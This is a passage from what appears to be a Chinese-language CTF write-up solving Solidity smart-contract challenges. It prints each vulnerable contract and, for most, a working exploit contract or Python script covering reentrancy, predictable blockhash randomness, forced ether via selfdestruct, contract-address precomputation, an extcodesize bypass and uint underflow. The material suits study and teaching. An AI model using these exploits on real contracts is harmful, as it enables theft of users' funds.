\u770b\u4e00\u4e0b\u9700\u8981\u8f6c\u51fa\u7684\u91d1\u989d\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521d\u59cb + 1Wei \u7684\u65b9\u5f0f\u8ba1\u7b97\uff09\uff0c\u518d\u4e58\u4ee5\u4e8c\u5c31\u662f\u8981\u4f20\u7ed9 refundTokens \u7684\u53c2\u6570\u4e86 Secure Bank \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract SimpleBank is CtfFramework { mapping ( address => uint256 ) public balances ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { balances [ msg.sender ] = msg.value ; } function deposit ( address _user ) public payable ctf { balances [ _user ] += msg.value ; } function withdraw ( address _user , uint256 _value ) public ctf { require ( _value <= balances [ _user ], \"Insufficient Balance\" ); balances [ _user ] -= _value ; msg.sender . transfer ( _value ); } function () public payable ctf { deposit ( msg.sender ); } } contract MembersBank is SimpleBank { mapping ( address => string ) public members ; constructor ( address _ctfLauncher , address _player ) public payable SimpleBank ( _ctfLauncher , _player ) { } function register ( address _user , string _username ) public ctf { members [ _user ] = _username ; } modifier isMember ( address _user ){ bytes memory username = bytes ( members [ _user ]); require ( username . length != 0 , \"Member Must First Register\" ); _ ; } function deposit ( address _user ) public payable isMember ( _user ) ctf { super . deposit ( _user ); } function withdraw ( address _user , uint256 _value ) public isMember ( _user ) ctf { super . withdraw ( _user , _value ); } } contract SecureBank is MembersBank { constructor ( address _ctfLauncher , address _player ) public payable MembersBank ( _ctfLauncher , _player ) { } function deposit ( address _user ) public payable ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( msg.value < 100 ether , \"Exceeding Account Limits\" ); require ( msg.value >= 1 ether , \"Does Not Satisfy Minimum Requirement\" ); super . deposit ( _user ); } function withdraw ( address _user , uint8 _value ) public ctf { require ( msg.sender == _user , \"Unauthorized User\" ); require ( _value < 100 , \"Exceeding Account Limits\" ); require ( _value >= 1 , \"Does Not Satisfy Minimum Requirement\" ); super . withdraw ( _user , _value * 1 ether ); } function register ( address _user , string _username ) public ctf { require ( bytes ( _username ). length != 0 , \"Username Not Enough Characters\" ); require ( bytes ( _username ). length <= 20 , \"Username Too Many Characters\" ); super . register ( _user , _username ); } } \u5408\u7ea6\u6709\u70b9\u957f\uff0c\u6709\u4e09\u4e2a\u5408\u7ea6 SimpleBank\u3001MembersBank \u548c SecureBank\uff0c\u662f\u9010\u4e2a\u7ee7\u627f\u7684\u5173\u7cfb \u901a\u8fc7 SimpleBank \u7684 constructor \u53ef\u4ee5\u770b\u51fa\uff0c\u6240\u6709\u94b1\u90fd\u8f6c\u7ed9\u4e86\u9898\u76ee\u5408\u7ea6\u7684\u521b\u5efa\u8005\uff0c\u800c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff0c\u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8c03\u7528 withdraw \u51fd\u6570\u6765\u501f\u52a9\u521b\u5efa\u8005\u7684\u5730\u5740\u8f6c\u51fa\u5408\u7ea6\u4e2d\u7684\u94b1 \u800c withdraw \u5b58\u5728\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a SecureBank \u4e2d\u7684 withdraw \u68c0\u67e5\u4e86\u4f20\u5165\u7684 _user \u662f\u5426\u662f msg.sender\uff0c\u4e0d\u80fd\u4ece\u4e2d\u9020\u5047 SecureBank \u7684 withdraw \u7684 _value \u53c2\u6570\u662f uint8 \u7c7b\u578b\uff0c\u800c MembersBank \u4e2d withdraw \u7684\u53c2\u6570\u662f uint256 \u7c7b\u578b\uff0c\u8fd9\u5bfc\u81f4\u4e86\u8fd9\u4e24\u4e2a\u51fd\u6570\u5e76\u4e0d\u662f\u91cd\u8f7d\u5173\u7cfb\uff0c\u800c\u662f\u4e24\u4e2a\u51fd\u6570 \u6240\u4ee5\u73b0\u5728\u7684\u76ee\u6807\u662f\u8c03\u7528 MembersBank \u7684 withdraw \u51fd\u6570\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u5e26\u6709\u4e00\u4e2a isMember(_user) \u7684 modifier\uff0c\u6240\u4ee5\u5148\u8981\u7ed9\u521b\u5efa\u8005\u7684\u5730\u5740 register \u4e00\u4e0b\uff0c\u7136\u540e\u518d\u8c03\u7528 withdraw(address, uint256) \u8f6c\u51fa\u6240\u6709\u4f59\u989d\u5373\u53ef Lottery \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Lottery is CtfFramework { using SafeMath for uint256 ; uint256 public totalPot ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { totalPot = totalPot . add ( msg.value ); } function () external payable ctf { totalPot = totalPot . add ( msg.value ); } function play ( uint256 _seed ) external payable ctf { require ( msg.value >= 1 finney , \"Insufficient Transaction Value\" ); totalPot = totalPot . add ( msg.value ); bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( msg.sender )); bytes32 target = keccak256 ( abi . encodePacked ( entropy ^ entropy2 )); bytes32 guess = keccak256 ( abi . encodePacked ( _seed )); if ( guess == target ){ //winner uint256 payout = totalPot ; totalPot = 0 ; msg.sender . transfer ( payout ); } } } \u9884\u6d4b\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u7136\u540e\u6839\u636e play \u91cc\u7684\u903b\u8f91\u751f\u6210 target\uff0c\u7136\u540e\u4f20\u7ed9 play \u5373\u53ef \u9700\u8981\u6ce8\u610f\u7684\u662f\u8981\u652f\u4ed8 1 finney \u4f5c\u4e3a value\uff0c\u5e76\u4e14\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8981\u5148\u8c03\u7528\u4e00\u4e0b Lottery \u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\uff08\u6765\u81ea CtfFramework\uff09\u5c06\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355 exp contract Exploit { Lottery challenge ; constructor ( address addr ) public { challenge = Lottery ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number ); bytes32 entropy2 = keccak256 ( abi . encodePacked ( this )); uint256 ans = uint256 ( entropy ^ entropy2 ); challenge . play . value ( msg.value )( ans ); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } } Heads or Tails \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract HeadsOrTails is CtfFramework { using SafeMath for uint256 ; uint256 public gameFunds ; uint256 public cost ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { gameFunds = gameFunds . add ( msg.value ); cost = gameFunds . div ( 10 ); } function play ( bool _heads ) external payable ctf { require ( msg.value == cost , \"Incorrect Transaction Value\" ); require ( gameFunds >= cost . div ( 2 ), \"Insufficient Funds in Game Contract\" ); bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; if (( coinFlip == 1 && _heads ) || ( coinFlip == 0 && ! _heads )) { //win gameFunds = gameFunds . sub ( msg.value . div ( 2 )); msg.sender . transfer ( msg.value . mul ( 3 ). div ( 2 )); } else { //loser gameFunds = gameFunds . add ( msg.value ); } } } \u540c\u6837\u662f\u8ba1\u7b97\u4f2a\u968f\u673a\u6570\uff0c\u6bcf\u6b21 play \u9700\u8981 0.1 ether\uff0c\u5e76\u4e14\u4ece\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u8f6c\u51fa 0.05 ether \u4f5c\u4e3a\u5956\u52b1\u3002\u56e0\u6b64\u9700\u8981\u8c03\u7528 20 \u6b21 play \u6765\u8f6c\u51fa\u8d26\u6237\u4e2d\u7684 2 ether \u540c\u6837\u9700\u8981\u5728\u90e8\u7f72\u5408\u7ea6\u540e\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\u6765\u5c06\u653b\u51fb\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355\u3002\u5e76\u4e14\u505a\u5b8c\u4e4b\u540e selfdestruct \u6765\u8f6c\u56de\u653b\u51fb\u5408\u7ea6\u4e2d\u7684 3 ether \u4f1a\u6bd4\u8f83\u597d exp contract Exploit { HeadsOrTails challenge ; constructor ( address addr ) public { challenge = HeadsOrTails ( addr ); } function exp () public payable { bytes32 entropy = blockhash ( block.number - 1 ); bytes1 coinFlip = entropy [ 0 ] & 1 ; for ( int i = 0 ; i < 20 ; i ++ ) { if ( coinFlip == 1 ) { challenge . play . value ( 0 . 1 ether )( true ); } else { challenge . play . value ( 0 . 1 ether )( false ); } } } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } } Trust Fund \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract TrustFund is CtfFramework { using SafeMath for uint256 ; uint256 public allowancePerYear ; uint256 public startDate ; uint256 public numberOfWithdrawls ; bool public withdrewThisYear ; address public custodian ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { custodian = msg.sender ; allowancePerYear = msg.value . div ( 10 ); startDate = now ; } function checkIfYearHasPassed () internal { if ( now >= startDate + numberOfWithdrawls * 365 days ){ withdrewThisYear = false ; } } function withdraw () external ctf { require ( allowancePerYear > 0 , \"No Allowances Allowed\" ); checkIfYearHasPassed (); require ( ! withdrewThisYear , \"Already Withdrew This Year\" ); if ( msg.sender . call . value ( allowancePerYear )()){ withdrewThisYear = true ; numberOfWithdrawls = numberOfWithdrawls . add ( 1 ); } } function returnFunds () external payable ctf { require ( msg.value == allowancePerYear , \"Incorrect Transaction Value\" ); require ( withdrewThisYear == true , \"Cannot Return Funds Before Withdraw\" ); withdrewThisYear = false ; numberOfWithdrawls = numberOfWithdrawls . sub ( 1 ); } } \u91cd\u5165\u653b\u51fb\uff0c\u5199\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u5176 fallback \u4e2d\u518d\u6b21\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\uff0c\u6ce8\u610f\u8981\u5728 MetaMask \u53d1\u9001\u4ea4\u6613\u65f6\u63d0\u9ad8\u4e00\u4e0b gas\uff0c\u4e0d\u7136\u5185\u90e8\u7684\u4ea4\u6613\u4f1a\u51fa\u73b0 gas \u4e0d\u8db3\u7684\u95ee\u9898 exp contract Exploit { TrustFund challenge ; constructor ( address addr ) public { challenge = TrustFund ( addr ); } function exp () public { challenge . withdraw (); } function () public payable { challenge . withdraw (); } function destroy ( address addr ) public { selfdestruct ( addr ); } } Record Label \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract Royalties { using SafeMath for uint256 ; address private collectionsContract ; address private artist ; address [] private receiver ; mapping ( address => uint256 ) private receiverToPercentOfProfit ; uint256 private percentRemaining ; uint256 public amountPaid ; constructor ( address _manager , address _artist ) public { collectionsContract = msg.sender ; artist = _artist ; receiver . push ( _manager ); receiverToPercentOfProfit [ _manager ] = 80 ; percentRemaining = 100 - receiverToPercentOfProfit [ _manager ]; } modifier isCollectionsContract () { require ( msg.sender == collectionsContract , \"Unauthorized: Not Collections Contract\" ); _ ; } modifier isArtist (){ require ( msg.sender == artist , \"Unauthorized: Not Artist\" ); _ ; } function addRoyaltyReceiver ( address _receiver , uint256 _percent ) external isArtist { require ( _percent < percentRemaining , \"Precent Requested Must Be Less Than Percent Remaining\" ); receiver . push ( _receiver ); receiverToPercentOfProfit [ _receiver ] = _percent ; percentRemaining = percentRemaining . sub ( _percent ); } function payoutRoyalties () public payable isCollectionsContract { for ( uint256 i = 0 ; i < receiver . length ; i ++ ){ address current = receiver [ i ]; uint256 payout = msg.value . mul ( receiverToPercentOfProfit [ current ]). div ( 100 ); amountPaid = amountPaid . add ( payout ); current . transfer ( payout ); } msg.sender . call . value ( msg.value - amountPaid )( bytes4 ( keccak256 ( \"collectRemainingFunds()\" ))); } function getLastPayoutAmountAndReset () external isCollectionsContract returns ( uint256 ){ uint256 ret = amountPaid ; amountPaid = 0 ; return ret ; } function () public payable isCollectionsContract { payoutRoyalties (); } } contract Manager { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function withdraw ( uint256 _balance ) public { owner . transfer ( _balance ); } function () public payable { // empty } } contract RecordLabel is CtfFramework { using SafeMath for uint256 ; uint256 public funds ; address public royalties ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { royalties = new Royalties ( new Manager ( _ctfLauncher ), _player ); funds = funds . add ( msg.value ); } function () external payable ctf { funds = funds . add ( msg.value ); } function withdrawFundsAndPayRoyalties ( uint256 _withdrawAmount ) external ctf { require ( _withdrawAmount <= funds , \"Insufficient Funds in Contract\" ); funds = funds . sub ( _withdrawAmount ); royalties . call . value ( _withdrawAmount )(); uint256 royaltiesPaid = Royalties ( royalties ). getLastPayoutAmountAndReset (); uint256 artistPayout = _withdrawAmount . sub ( royaltiesPaid ); msg.sender . transfer ( artistPayout ); } function collectRemainingFunds () external payable { require ( msg.sender == royalties , \"Unauthorized: Not Royalties Contract\" ); } } \u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\uff0c\u4f46\u662f\u5927\u81f4\u770b\u4e00\u4e0b\u7684\u8bdd\u5c31\u53ef\u4ee5\u770b\u51fa\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u7684\u65f6\u5019\u4f1a\u628a\u5168\u90e8\u7684 _withdrawAmount \u5168\u90e8\u4f20\u7ed9 Royalties\uff0c\u5176\u4e2d\u4f1a\u5c06 80% \u4f20\u7ed9\u6211\u4eec\uff0c\u518d\u628a 20% \u4f20\u56de\u53bb\uff0c\u800c\u8fd9 20% \u53c8\u4f1a\u5728 withdrawFundsAndPayRoyalties \u4e2d\u518d\u4f20\u7ed9\u6211\u4eec\u3002\u6240\u4ee5\u53ea\u9700\u8981\u76f4\u63a5\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u5c06 1 ether \u63d0\u53d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86 Slot Machine \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; import \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\" ; contract SlotMachine is CtfFramework { using SafeMath for uint256 ; uint256 public winner ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { winner = 5 ether ; } function () external payable ctf { require ( msg.value == 1 szabo , \"Incorrect Transaction Value\" ); if ( address ( this ). balance >= winner ){ msg.sender . transfer ( address ( this ). balance ); } } } \u76ee\u6807\u662f\u8ba9\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u7684\u4f59\u989d\u4e0d\u5c11\u4e8e 5 ether\uff0c\u800c\u4e14\u5408\u7ea6\u4e2d\u7684 fallback \u51fd\u6570\u53ea\u63a5\u6536 1 szabo \u4f46\u662f\u5982\u679c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5269\u4f59\u4f59\u989d\u5168\u90e8\u8f6c\u79fb\u5230\u9898\u76ee\u5408\u7ea6\u4e0a\u7684\u8bdd\u662f\u4e0d\u4f1a\u7ecf\u8fc7 fallback \u51fd\u6570\u7684\uff0c\u6240\u4ee5\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u8f6c\u5165\u4e0d\u5c11\u4e8e 3.5 ether \u7136\u540e\u518d selfdestruct \u5c31\u53ef\u4ee5\u4e86 exp contract Exploit { address challenge ; constructor ( address addr ) public payable { challenge = addr ; } function exp () public { selfdestruct ( challenge ); } } Rainy Day Fund \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract DebugAuthorizer { bool public debugMode ; constructor () public payable { if ( address ( this ). balance == 1 . 337 ether ){ debugMode = true ; } } } contract RainyDayFund is CtfFramework { address public developer ; mapping ( address => bool ) public fundManagerEnabled ; DebugAuthorizer public debugAuthorizer ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development debugAuthorizer = new DebugAuthorizer (); developer = msg.sender ; fundManagerEnabled [ msg.sender ] = true ; } modifier isManager () { require ( fundManagerEnabled [ msg.sender ] || debugAuthorizer . debugMode () || msg.sender == developer , \"Unauthorized: Not a Fund Manager\" ); _ ; } function () external payable ctf { // Anyone can add to the fund } function addFundManager ( address _newManager ) external isManager ctf { fundManagerEnabled [ _newManager ] = true ; } function removeFundManager ( address _previousManager ) external isManager ctf { fundManagerEnabled [ _previousManager ] = false ; } function withdraw () external isManager ctf { msg.sender . transfer ( address ( this ). balance ); } } \u8f6c\u51fa\u6240\u6709\u94b1\u7684\u8bdd\u8981\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u5b83\u5e26\u6709 isManager \u8fd9\u4e2a modifier\uff0c\u800c manager \u6211\u4eec\u6539\u4e0d\u4e86\uff0c\u6240\u4ee5\u601d\u8def\u5728\u4e8e\u5f00\u542f debug mode \u4f46\u662f\u9898\u76ee\u7684 constructor \u4e2d\u4f1a\u521b\u5efa DebugAuthorizer \u5408\u7ea6\u5b9e\u4f8b\u800c\u4e14\u5e76\u4e0d\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u6253\u5f00 debug mode\uff0c\u540e\u7eed\u518d\u5411\u5176\u4e2d\u8f6c\u8d26\u7684\u8bdd\u4e5f\u4e0d\u4f1a\u6253\u5f00 debug mode\uff08\u56e0\u4e3a\u8fd9\u4e2a\u662f\u5728 constructor \u4e2d\u8d4b\u503c\u7684\uff09 \u6240\u4ee5\u5c31\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6b21 developer \u90e8\u7f72\u7684\u9898\u76ee\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u63d0\u524d\u8ba1\u7b97\u51fa\u5176\u521b\u5efa\u7684 DebugAuthorizer \u7684\u5730\u5740\uff0c\u5148\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u8fd9\u65f6\u91cd\u542f\u9898\u76ee\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9898\u76ee\u5408\u7ea6\uff0c\u5176\u4e2d\u521b\u5efa DebugAuthorizer \u65f6\u68c0\u67e5 balance \u53d1\u73b0\u5df2\u7ecf\u6709\u4e86 1.337 ether\uff0c\u4e5f\u5c31\u6253\u5f00\u4e86 debug mode \u53ef\u4ee5\u76f4\u63a5 withdraw \u800c\u63d0\u524d\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u7684\u65b9\u6cd5\u5c31\u662f\u8fd0\u7528 create \u7684\u539f\u7406\uff0c\u5373\u5916\u90e8\u8d26\u6237\u521b\u5efa\u5408\u7ea6\u6216\u8005\u5728\u5408\u7ea6\u4e2d\u901a\u8fc7 CREATE \u64cd\u4f5c\u7801\u521b\u5efa\u65b0\u5408\u7ea6\u7684\u65f6\u5019\u8ba1\u7b97\u5730\u5740\u7684\u7b97\u6cd5\u662f\uff1a keccak ( rlp . encode ([ deployer , nonce ])) \u5e76\u4e14\u5728\u5408\u7ea6\u5185\u90e8\u901a\u8fc7 CREATE \u521b\u5efa\u65b0\u5408\u7ea6\u7684\u8bdd\uff0cnonce \u5e94\u8be5\u662f 1 \u76ee\u524d\u9700\u8981\u77e5\u9053\u7684\u662f developer\uff08\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff09\u90e8\u7f72\u5f53\u524d\u9898\u76ee\u5408\u7ea6\u65f6\u7684 nonce \u662f\u591a\u5c11\uff08\u77e5\u9053\u4e86\u8fd9\u4e2a\u4e4b\u540e\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u7684 nonce \u5c31\u662f\u5176\u52a0\u4e00\uff09\uff0c\u53ea\u9700\u8981\u679a\u4e3e\u4e00\u4e0b nonce \u8ba1\u7b97\u5730\u5740\u518d\u548c\u5f53\u524d\u9898\u76ee\u5730\u5740\u6bd4\u8f83\u4e00\u4e0b\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u6765\uff1a import rlp import web3 def calc_address ( deployer , nonce ): return web3 . Web3 . keccak ( rlp . encode ([ deployer , nonce ])) for nonce in range ( 1 , 1000000 ): if calc_address ( 0xeD0D5160c642492b3B482e006F67679F5b6223A2 , nonce ) . hex () . endswith ( \"66318f6b06fd5769fa310732566b13d92cfbc589\" ): print ( nonce ) break \u53ef\u4ee5\u5f97\u5230\u5f53\u524d nonce \u662f 484\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b21\u518d\u90e8\u7f72\u9898\u76ee\u7684 nonce \u5c31\u662f 485\u3002\u7136\u540e\u63d0\u524d\u8ba1\u7b97\u9898\u76ee\u5730\u5740\u548c DebugAuthorizer \u5730\u5740\uff1a deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2 nonce = 485 challenge = int ( calc_address ( deployer , nonce ) . hex ()[ - 40 :], 16 ) print ( f \"next challenge address: { hex ( challenge ) } \" ) debug = int ( calc_address ( challenge , 1 ) . hex ()[ - 40 :], 16 ) print ( f \"next DebugAuthorizer address: { hex ( debug ) } \" ) \"\"\" next challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \"\"\" \u6240\u4ee5\u5148\u5411 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe \u8f6c\u8d26 1.337 ether\uff0c\u518d\u91cd\u7f6e\u9898\u76ee\uff08\u53ef\u4ee5\u9a8c\u8bc1\u4e00\u4e0b\u73b0\u5728\u7684\u9898\u76ee\u5730\u5740\u5c31\u662f 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d\uff09\uff0c\u76f4\u63a5\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86 Raffle \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; contract Raffle is CtfFramework { uint256 constant fee = 0 . 1 ether ; address private admin ; bytes4 private winningTicket ; uint256 private blocknum ; uint256 public ticketsBought ; bool public raffleStopped ; mapping ( address => uint256 ) private rewards ; mapping ( address => bool ) private potentialWinner ; mapping ( address => bytes4 ) private ticketNumbers ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { rewards [ address ( this )] = msg.value ; admin = msg.sender ; } function buyTicket () external payable ctf { if ( msg.value >= fee ){ winningTicket = bytes4 ( 0 ); blocknum = block.number + 1 ; ticketsBought += 1 ; raffleStopped = false ; rewards [ msg.sender ] += msg.value ; ticketNumbers [ msg.sender ] = bytes4 (( msg.value - fee ) / 10 ** 8 ); potentialWinner [ msg.sender ] = true ; } } function closeRaffle () external ctf { require ( ticketsBought > 0 ); require ( ! raffleStopped ); require ( blocknum != 0 ); require ( winningTicket == bytes4 ( 0 )); require ( block.number > blocknum ); require ( msg.sender == admin || rewards [ msg.sender ] > 0 ); winningTicket = bytes4 ( blockhash ( blocknum )); potentialWinner [ msg.sender ] = false ; raffleStopped = true ; } function collectReward () external payable ctf { require ( raffleStopped ); require ( potentialWinner [ msg.sender ]); rewards [ address ( this )] += msg.value ; if ( winningTicket == ticketNumbers [ msg.sender ]){ msg.sender . transfer ( rewards [ msg.sender ]); msg.sender . transfer ( rewards [ address ( this )]); rewards [ msg.sender ] = 0 ; rewards [ address ( this )] = 0 ; } } function skimALittleOffTheTop ( uint256 _value ) external ctf { require ( msg.sender == admin ); require ( rewards [ address ( this )] > _value ); rewards [ address ( this )] = rewards [ address ( this )] - _value ; msg.sender . transfer ( _value ); } function () public payable ctf { if ( msg.value >= fee ){ this . buyTicket (); } else if ( msg.value == 0 ){ this . closeRaffle (); } else { this . collectReward (); } } } \u662f\u4e00\u4e2a\u62bd\u5956\uff0c\u9700\u8981\u901a\u8fc7 buyTicket \u4e70\u7968\u83b7\u5f97\u8d44\u683c\uff0c\u5e76\u4e14 ticketNumbers \u4e3a (msg.value - fee)/10**8\uff0c\u7ed3\u675f\u62bd\u5956\u9700\u8981\u8c03\u7528 closeRaffle \u51fd\u6570\uff0c\u4f46\u662f\u8fd9\u4e5f\u4f1a\u53d6\u6d88\u62bd\u5956\u8d44\u683c\u3002\u800c\u6700\u540e\u62bd\u4e2d\u7684 ticketNumbers \u4e3a\u6700\u540e\u4e00\u4e2a\u4e70\u7968\u7684 blocknum \u7684 blockhash \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0cblockhash \u53ea\u4f1a\u8ba1\u7b97\u6700\u8fd1\u7684 256 \u4e2a\u5757\uff0c\u518d\u65e9\u7684\u7ed3\u679c\u4f1a\u662f 0 \u4f46\u662f\u5982\u679c\u4f7f\u7528\u4e24\u4e2a\u5408\u7ea6\u4e00\u4e2a\u6765\u5173\u95ed\u62bd\u5956\uff0c\u53e6\u4e00\u4e2a\u9886\u5956\u7684\u8bdd\uff0c\u4e0d\u80fd\u53d6\u51fa\u5168\u90e8\u7684\u4f59\u989d\uff08\u56e0\u4e3a\u5173\u95ed\u62bd\u5956\u7684\u8d26\u6237\u4e70\u7968\u7684\u94b1\u4e0d\u4f1a\u8f6c\u51fa\u6765\uff09\u3002\u56e0\u6b64\u9700\u8981\u901a\u8fc7 fallback \u51fd\u6570\uff0cvalue \u4e3a 0 \u7684\u65f6\u5019\u4f1a\u8c03\u7528 closeRaffle\uff0c\u8fd9\u4f1a\u4f7f closeRaffle \u5224\u65ad\u7684 msg.sender \u4e3a\u81ea\u8eab\u3002\u6240\u4ee5\u53ea\u9700\u8981\u4e70\u4e0b\u7968\uff0c\u7136\u540e\u7b49\u5f85\u51fa 256 \u4e2a\u5757\u4e4b\u540e\u89e6\u53d1 fallback \u7136\u540e\u518d collectReward \u5c31\u597d\u4e86 \u8fd9\u91cc\u6ce8\u610f\u8fd8\u8981\u628a\u9898\u76ee\u5408\u7ea6\u5730\u5740\u901a\u8fc7\u8c03\u7528 ctf_challenge_add_authorized_sender \u52a0\u5165\u767d\u540d\u5355\uff0c\u624d\u53ef\u4ee5\u5728 fallback \u4e2d\u8c03\u7528\u81ea\u8eab\u51fd\u6570 exp contract Exploit { Raffle challenge ; constructor ( address addr ) public { challenge = Raffle ( addr ); } function buyTicket () public payable { challenge . buyTicket . value ( msg.value )(); } function exp () public { address ( challenge ). call . value ( 0 ether )(); challenge . collectReward (); } function () public payable {} function destroy ( address addr ) public { selfdestruct ( addr ); } } Scratchcard \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.4.24 ; import \"../CtfFramework.sol\" ; library Address { function isContract ( address account ) internal view returns ( bool ) { uint256 size ; assembly { size : = extcodesize ( account ) } return size > 0 ; } } contract Scratchcard is CtfFramework { event CardPurchased ( address indexed player , uint256 cost , bool winner ); mapping ( address => uint256 ) private winCount ; uint256 private cost ; using Address for address ; constructor ( address _ctfLauncher , address _player ) public payable CtfFramework ( _ctfLauncher , _player ) { } modifier notContract (){ require ( ! msg.sender . isContract (), \"Contracts Not Allowed\" ); _ ; } function play () public payable notContract ctf { bool won = false ; if (( now % 10 ** 8 ) * 10 ** 10 == msg.value ){ won = true ; winCount [ msg.sender ] += 1 ; cost = msg.value ; msg.sender . transfer ( cost ); } else { cost = 0 ; winCount [ msg.sender ] = 0 ; } emit CardPurchased ( msg.sender , msg.value , won ); } function checkIfMegaJackpotWinner () public view returns ( bool ){ return ( winCount [ msg.sender ] >= 25 ); } function collectMegaJackpot ( uint256 _amount ) public notContract ctf { require ( checkIfMegaJackpotWinner (), \"User Not Winner\" ); require ( 2 * cost - _amount > 0 , \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\" ); winCount [ msg.sender ] = 0 ; msg.sender . transfer ( _amount ); } function () public payable ctf { play (); } } \u8c03\u7528 play \u6765\u731c\u968f\u673a\u6570\uff0cplay \u51fd\u6570\u6709\u4e00\u4e2a notContract \u7684 modifier\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u5728 constructor \u4e2d\u76f4\u63a5\u64cd\u4f5c\u6765\u7ed5\u8fc7\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u653b\u51fb\u5408\u7ea6\u4e2d\u8c03\u7528 25 \u6b21 play \u51fd\u6570\u6765\u8fbe\u5230\u6761\u4ef6\uff0c\u8f6c\u51fa\u7684\u65f6\u5019\u867d\u7136\u5224\u65ad\u4e86 2 * cost - _amount > 0 \u4f46\u90fd\u662f uint \u53ef\u4ee5\u4e0b\u6ea2\uff0c\u6240\u4ee5\u76f4\u63a5\u8f6c\u51fa\u5168\u90e8\u5c31\u597d\u4e86 